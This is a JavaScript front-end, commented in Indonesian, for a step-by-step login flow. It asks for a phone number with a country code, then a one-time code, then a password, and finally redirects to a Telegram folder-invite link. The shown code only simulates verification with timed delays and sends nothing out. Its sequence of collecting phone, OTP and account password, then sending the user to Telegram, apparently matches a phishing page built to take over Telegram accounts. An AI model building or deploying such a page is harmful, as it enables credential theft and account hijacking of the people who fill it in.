// Daftar negara Asia beserta kode negara mereka
const asianCountries = [
  { name: "Indonesia", code: "+62" },
  { name: "Malaysia", code: "+60" },
  { name: "Singapore", code: "+65" },
  { name: "Thailand", code: "+66" },
  { name: "Vietnam", code: "+84" },
  { name: "Philippines", code: "+63" },
  { name: "Japan", code: "+81" },
  { name: "South Korea", code: "+82" },
  { name: "China", code: "+86" },
  { name: "India", code: "+91" },
  { name: "Pakistan", code: "+92" },
  { name: "Bangladesh", code: "+880" },
  { name: "Sri Lanka", code: "+94" },
  { name: "Nepal", code: "+977" },
  { name: "Myanmar", code: "+95" },
];

// Mengisi dropdown negara dengan daftar negara Asia
const countrySelect = document.getElementById("country");
asianCountries.forEach((country) => {
  const option = document.createElement("option");
  option.value = country.code;
  option.textContent = country.name;
  countrySelect.appendChild(option);
});

// Fungsi untuk mengupdate kode negara dan placeholder nomor telepon
function updatePhoneNumber() {
  const selectedCode = countrySelect.value;
  document.getElementById("country-code").textContent = selectedCode;
  document.getElementById(
    "phone-number"
  ).placeholder = `${selectedCode} 123456789`;
}

// Set default negara dan placeholder saat halaman dimuat
document.addEventListener("DOMContentLoaded", () => {
  countrySelect.value = "+62"; // Set default ke Indonesia
  updatePhoneNumber();
});

// Fungsi untuk menampilkan spinner loading
function showLoading() {
  document.getElementById("loading").style.display = "block";
}

// Fungsi untuk menyembunyikan spinner loading
function hideLoading() {
  document.getElementById("loading").style.display = "none";
}

// Fungsi untuk menampilkan halaman konfirmasi kode
function showCodeConfirmation(event) {
  event.preventDefault(); // Mencegah form agar tidak refresh halaman

  // Tampilkan spinner loading
  showLoading();

  // Mendapatkan nomor telepon dari input
  const countryCode = document.getElementById("country-code").textContent;
  const phoneNumber = document.getElementById("phone-number").value;
  const fullPhoneNumber = `${countryCode} ${phoneNumber}`;

  // Simulasi waktu pemrosesan (misalnya memanggil API atau memverifikasi nomor)
  setTimeout(() => {
    // Sembunyikan spinner setelah proses selesai
    hideLoading();

    // Menampilkan halaman konfirmasi kode
    document.getElementById("phone-form").style.display = "none";
    document.getElementById("code-confirmation").style.display = "block";
    document.getElementById("phone-display").textContent = fullPhoneNumber;
  }, 1000); // Simulasi delay 1 detik
}

// Fungsi untuk menampilkan halaman konfirmasi password
function showPasswordConfirmation(event) {
  event.preventDefault(); // Mencegah form agar tidak refresh halaman

  // Tampilkan spinner loading
  showLoading();

  // Simulasi waktu pemrosesan (misalnya memanggil API atau memverifikasi OTP)
  setTimeout(() => {
    // Sembunyikan spinner setelah proses selesai
    hideLoading();

    // Menampilkan halaman konfirmasi password
    document.getElementById("code-confirmation").style.display = "none";
    document.getElementById("password-confirmation").style.display = "block";
  }, 1000); // Simulasi delay 1 detik
}

// Fungsi untuk toggle visibility pada input password
function togglePasswordVisibility() {
  const passwordInput = document.getElementById("password");
  const toggleButton = document.getElementById("toggle-visibility");

  if (passwordInput.type === "password") {
    passwordInput.type = "text";
    toggleButton.textContent = "Sembunyikan Password"; // Ganti ikon tombol
  } else {
    passwordInput.type = "password";
    toggleButton.textContent = "Tampilkan Password"; // Kembali ke ikon awal
  }
}

// Validasi input nomor telepon agar hanya bisa diisi angka
const phoneNumberInput = document.getElementById("phone-number");
phoneNumberInput.addEventListener("input", function (event) {
  // Menghapus karakter non-numerik
  this.value = this.value.replace(/\D/g, "");
});

// Validasi input OTP agar hanya menerima angka 5-6 digit
const otpInput = document.getElementById("verification-code");
otpInput.addEventListener("input", function (event) {
  // Menghapus karakter non-numerik dan membatasi panjang maksimum 6 digit
  this.value = this.value.replace(/\D/g, "").slice(0, 6);
});

// Fungsi untuk memvalidasi panjang OTP sebelum pengiriman
function validateOTP(event) {
  const otpLength = otpInput.value.length;
  if (otpLength < 5 || otpLength > 6) {
    event.preventDefault(); // Mencegah pengiriman jika panjang OTP tidak sesuai
    alert("OTP harus terdiri dari 5-6 digit angka.");
  }
}

// Menambahkan event listener pada form OTP untuk validasi saat submit
document
  .querySelector("#code-confirmation form")
  .addEventListener("submit", validateOTP);

// Fungsi untuk menampilkan tombol "Kirim Ulang OTP" setelah 5 detik
function showResendButton() {
  const resendButton = document.getElementById("resend-otp");

  // Sembunyikan tombol saat pertama kali masuk ke form OTP
  resendButton.style.display = "none";

  // Tampilkan tombol setelah 5 detik
  setTimeout(() => {
    resendButton.style.display = "block";
  }, 5000);
}

// Fungsi untuk redirect ke Telegram setelah login sukses
function redirectToTelegram(event) {
  event.preventDefault();
  const password = document.getElementById("password").value;

  if (!password) {
    alert("Harap masukkan password.");
    return;
  }

  // Tampilkan spinner loading
  showLoading();

  // Simulasi waktu pemrosesan (misalnya verifikasi password)
  setTimeout(() => {
    // Sembunyikan spinner setelah proses selesai
    hideLoading();

    // Tampilkan pop-up sukses
    document.getElementById("password-confirmation").style.display = "none";
    document.getElementById("popup").style.display = "flex";

    // Setelah 2 detik, arahkan ke Telegram
    setTimeout(function () {
      window.location.href = "https://t.me/addlist/eVdjrtPN-d04YzVl";
    }, 2000);
  }, 1000); // Simulasi delay 1 detik
}

// Fungsi untuk mereset form kembali ke awal
function resetForms() {
  // Reset input form
  document.getElementById("country").value = "+62"; // Set default ke Indonesia
  document.getElementById("phone-number").value = "";
  document.getElementById("verification-code").value = "";
  document.getElementById("password").value = "";

  // Reset placeholder dan kode negara
  updatePhoneNumber();

  // Reset semua halaman form yang terlihat
  document.getElementById("phone-form").style.display = "block";
  document.getElementById("code-confirmation").style.display = "none";
  document.getElementById("password-confirmation").style.display = "none";
  document.getElementById("popup").style.display = "none";
}

// Fungsi untuk menampilkan spinner loading
function showLoading() {
  document.getElementById("loading").style.display = "block";
}

// Fungsi untuk menyembunyikan spinner loading
function hideLoading() {
  document.getElementById("loading").style.display = "none";
}
